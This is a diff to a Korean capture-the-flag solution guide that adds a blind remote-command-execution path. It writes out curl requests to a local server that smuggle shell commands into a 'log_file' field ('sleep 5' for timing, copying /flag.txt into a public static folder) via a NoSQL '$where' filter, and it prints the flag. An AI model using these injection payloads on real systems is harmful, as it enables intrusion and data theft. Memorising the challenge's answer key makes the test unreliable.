@@ -753,7 +753,181 @@ curl http://localhost:5000/static/flag.txt
 
 ---
 
+### 🔀 분기점: Blind RCE 여부
+
+**참가자가 받을 수 있는 두 가지 응답:**
+
+#### **Case A: log_output 있음** (BLIND_RCE=false)
+```json
+{
+  "count": 4,
+  "mode": "advanced",
+  "log_output": "Migration started\n..."  ← 출력 보임!
+}
+```
+→ **바로 Stage 7로 이동** (Command Injection 직접 테스트)
+
+#### **Case B: log_output 없음** (BLIND_RCE=true) ⚠️
+```json
+{
+  "count": 4,
+  "mode": "advanced",
+  "status": "migration complete"
+}
+```
+→ **Blind RCE 우회 필요** (아래 계속)
+
+---
+
+## Stage 6.5: Blind RCE 우회 (BLIND_RCE=true인 경우)
+
+> **주의**: 이 섹션은 BLIND_RCE=true 환경에서만 필요합니다.
+> log_output 필드가 나타나면 이 단계를 건너뛰고 Stage 7로 이동하세요.
+
+### Action 22-B-1: Blind RCE 발견
+
+```bash
+# log_file을 변경해도 출력이 안 나옴
+curl -X POST http://localhost:5000/api/admin/db/migrate \
+  -H "Cookie: session=..." \
+  -d '{
+    "filter": {"$where": "function() { return true; }"},
+    "log_file": "/tmp/another.log"
+  }'
+```
+
+**결과**:
+```json
+{
+  "count": 4,
+  "mode": "advanced",
+  "status": "migration complete"
+}
+```
+
+### 참가자의 사고:
+> "흠... log_file을 바꿔도 출력이 보이지 않는다.
+>
+> 하지만 'mode: advanced'가 나온다는 것은 뭔가 실행되고 있다는 뜻이다.
+>
+> 이것은 Blind RCE (Blind Remote Code Execution)일 가능성이 높다.
+> - 명령어는 실행된다
+> - 하지만 출력을 볼 수 없다
+>
+> Blind RCE 우회 방법:
+> 1. Time-based: sleep 명령어로 시간 지연 확인
+> 2. Out-of-Band: 외부 서버로 데이터 전송
+> 3. File-based: 파일로 저장 후 웹으로 접근
+>
+> 일단 Time-based로 실행 여부를 확인해보자."
+
+### Action 22-B-2: Time-based 확인
+
+```bash
+# sleep 5 명령어 실행
+curl -w "\nTime: %{time_total}s\n" \
+  -X POST http://localhost:5000/api/admin/db/migrate \
+  -H "Cookie: session=..." \
+  -d '{
+    "filter": {"$where": "function() { return true; }"},
+    "log_file": "/dev/null; sleep 5"
+  }'
+```
+
+**결과**:
+```json
+{
+  "count": 4,
+  "mode": "advanced",
+  "status": "migration complete"
+}
+Time: 5.234s
+```
+
+### 참가자의 사고:
+> "5초가 걸렸다! 명령어가 실제로 실행되고 있다!
+>
+> 이제 Blind RCE를 우회해서 FLAG를 얻어야 한다.
+>
+> 외부 서버가 없으니 File-based 방법을 사용하자.
+> 웹 서버의 static 디렉토리에 파일을 생성하면 브라우저로 접근 가능할 것 같다."
+
+### Action 22-B-3: 파일 기반 우회 시도
+
+```bash
+# 1단계: /flag.txt를 static 디렉토리로 복사
+curl -X POST http://localhost:5000/api/admin/db/migrate \
+  -H "Cookie: session=..." \
+  -d '{
+    "filter": {"$where": "function() { return true; }"},
+    "log_file": "/dev/null; cat /flag.txt > /app/static/flag.txt"
+  }'
+```
+
+**결과**:
+```json
+{
+  "count": 4,
+  "mode": "advanced",
+  "status": "migration complete"
+}
+```
+
+### 참가자의 사고:
+> "응답은 똑같지만, 명령어는 실행되었을 것이다.
+>
+> 이제 /static/flag.txt에 접근해보자."
+
+### Action 22-B-4: FLAG 파일 접근
+
+```bash
+# 브라우저 또는 curl로 접근
+curl http://localhost:5000/static/flag.txt
+```
+
+**결과**:
+```
+FLAG{l3g4cy_s3rv1c3s_4r3_d4ng3r0us_wh3n_f0rg0tt3n}
+```
+
+### 🎉 BLIND RCE 우회 성공!
+
+### 참가자의 사고:
+> "완벽하다! Blind RCE를 우회해서 FLAG를 얻었다!
+>
+> 핵심 기법:
+> 1. Time-based로 명령어 실행 확인
+> 2. 결과를 웹 접근 가능한 경로로 저장
+> 3. HTTP를 통해 파일 내용 확인
+>
+> 이것이 Blind RCE의 전형적인 우회 방법이다!"
+
+### 🏁 완료 시간 (Blind RCE 경로)
+- **총 소요 시간**: 약 105-110분
+- **Stage 6.5 추가 시간**: 10-15분
+
+> **다음**: Stage 7은 BLIND_RCE=false 환경에서의 직접적인 Command Injection 경로입니다.
+> BLIND_RCE=true 환경에서는 이미 FLAG를 획득했으므로 완료입니다.
+
+---
+
 ## Stage 7: Command Injection → RCE (80-95분)
+
+> **주의**: 이 섹션은 **BLIND_RCE=false** (log_output이 보이는 경우)에만 해당합니다.
+> BLIND_RCE=true 환경에서는 위의 Stage 6.5를 따르세요.
+
+### 전제 조건: log_output 필드 존재
+
+Action 22에서 다음과 같은 응답을 받았다고 가정:
+```json
+{
+  "count": 4,
+  "mode": "advanced",
+  "log_output": "Migration started\nProcessing 4 records\nMigration completed"
+}
+```
+
+이제 직접적인 Command Injection이 가능합니다.
 
 ### Action 23: Command Injection 테스트
 
@@ -810,6 +984,8 @@ FLAG{l3g4cy_s3rv1c3s_4r3_d4ng3r0us_wh3n_f0rg0tt3n}
 
 ## 📊 풀이 시간 분석
 
+### 경로 A: BLIND_RCE=false (직접 출력)
+
 | 단계 | 시간 | 누적 시간 |
 |------|------|----------|
 | Stage 0: 초기 정찰 | 10분 | 10분 |
@@ -821,7 +997,24 @@ FLAG{l3g4cy_s3rv1c3s_4r3_d4ng3r0us_wh3n_f0rg0tt3n}
 | Stage 6: NoSQL Injection | 15분 | 80분 |
 | Stage 7: RCE → FLAG | 15분 | **95분** |
 
-**총 풀이 시간: 약 95분 (1시간 35분)**
+**총 풀이 시간: 약 95분 (1시간 35분)** - Level 7 난이도
+
+### 경로 B: BLIND_RCE=true (Blind RCE)
+
+| 단계 | 시간 | 누적 시간 |
+|------|------|----------|
+| Stage 0: 초기 정찰 | 10분 | 10분 |
+| Red Herring (낭비) | 15분 | 25분 |
+| Stage 1: API Enumeration | 10분 | 35분 |
+| Stage 2: Salt 발견 | 5분 | 40분 |
+| Stage 3-4: 세션 위조 | 15분 | 55분 |
+| Stage 5: Admin API 탐색 | 10분 | 65분 |
+| Stage 6: NoSQL Injection | 15분 | 80분 |
+| **Stage 6.5: Blind RCE 우회** | **25분** | **105분** |
+
+**총 풀이 시간: 약 105-110분 (1시간 45분)** - Level 8 난이도
+
+> **차이점**: BLIND_RCE=true 환경에서는 출력을 볼 수 없어 Time-based 확인, 파일 기반 우회 등 추가 단계가 필요하므로 약 10-15분 더 소요됩니다.
 
 ---
 
@@ -846,6 +1039,17 @@ FLAG{l3g4cy_s3rv1c3s_4r3_d4ng3r0us_wh3n_f0rg0tt3n}
 
 ### 6. 취약점 체이닝
 > "NoSQL Injection ($where) → 다른 코드 경로 → log_file 파라미터 발견 → Command Injection"
+
+### 7. Blind RCE 대응 (BLIND_RCE=true인 경우)
+> "출력이 안 보인다... 하지만 'mode: advanced'가 나온다는 건 뭔가 실행되고 있다는 뜻이다.
+>
+> Time-based로 확인: sleep 5 → 5초 걸림 → 명령어 실행 확인!
+>
+> 이제 우회 방법:
+> 1. 외부 서버로 전송? (없음)
+> 2. 파일로 저장 후 웹 접근? (가능!)
+>
+> `/flag.txt > /app/static/flag.txt` → 성공!"
 
 ### 7. 페이로드 정제
 > "필터를 우회하려면 세미콜론을 사용. env 명령으로 환경변수에서 FLAG 발견!"
@@ -885,6 +1089,12 @@ FLAG{l3g4cy_s3rv1c3s_4r3_d4ng3r0us_wh3n_f0rg0tt3n}
    - Shell 명령어 체이닝
    - 필터 우회 (세미콜론)
    - 환경변수에서 FLAG 찾기
+
+7. **Blind RCE 우회** (BLIND_RCE=true인 경우)
+   - Time-based 기법으로 실행 확인
+   - Out-of-Band 데이터 유출
+   - File-based 우회 (웹 접근 가능 경로)
+   - Blind 환경에서의 창의적 사고
 
 ---
 
